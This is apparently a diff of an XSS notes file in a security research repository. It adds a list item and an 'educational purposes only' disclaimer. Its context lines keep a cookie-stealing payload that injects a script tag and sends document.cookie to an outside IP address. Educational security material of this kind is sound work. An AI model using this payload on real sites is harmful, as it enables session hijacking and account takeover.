@@ -165,4 +165,13 @@ a.send();
 "><script>new Image().src='http://10.10.15.190:8080/index.php?c='+document.cookie</script>
 ```
 
-falar ainda sobre dalfox e xss strike
+- falar ainda sobre dalfox e xss strike
+
+# 🛡️ Disclaimer 
+
+This repository was created **for educational and cybersecurity research purposes only**.  
+The use of any information, scripts, or tools contained herein **is the sole responsibility of the user**.  
+**I am not responsible for any misuse** or activity that violates local laws or third-party policies.
+
+
+© [GSecurity]
